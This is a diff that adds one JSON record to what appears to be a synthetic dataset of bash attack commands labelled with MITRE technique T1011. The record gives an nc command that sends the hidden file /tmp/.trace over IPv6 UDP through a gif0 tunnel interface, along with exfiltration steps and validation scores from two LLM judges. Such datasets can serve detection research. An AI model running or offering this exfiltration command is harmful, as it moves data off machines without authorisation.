@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
+  "explanation": "Transmits over the GIF tunnel interface (gif0) using IPv6 UDP with an uncommon port, explicitly leveraging a non-default tunnel medium consistent with T1011.",
+  "rationale_steps": [
+    "Use ipconfig to obtain the IPv6 address on gif0.",
+    "Bind the sender to force traffic through the GIF tunnel medium.",
+    "Exfiltrate via UDP to a link-local target using a rarely used port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-462c777a",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid nc flags (-6, -u, -s), balanced quoting, proper IPv6 link-local with scope-id, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It sends /tmp/.trace via IPv6 UDP to a link-local address scoped to gif0 using a gif0-sourced address, aligning with using a non-default tunnel interface for signaling, though success depends on gif0 having an IPv6 address/configuration.",
+        "combined_score": 4.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-01T17:42:58.211566Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid `nc` flags, a correctly structured command substitution for the source IP, and proper input redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by explicitly leveraging an IPv6 UDP tunnel interface (`gif0`) with a link-local address and an uncommon port to transmit data, demonstrating use of a non-default tunnel medium for signaling.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T17:43:14.224366Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
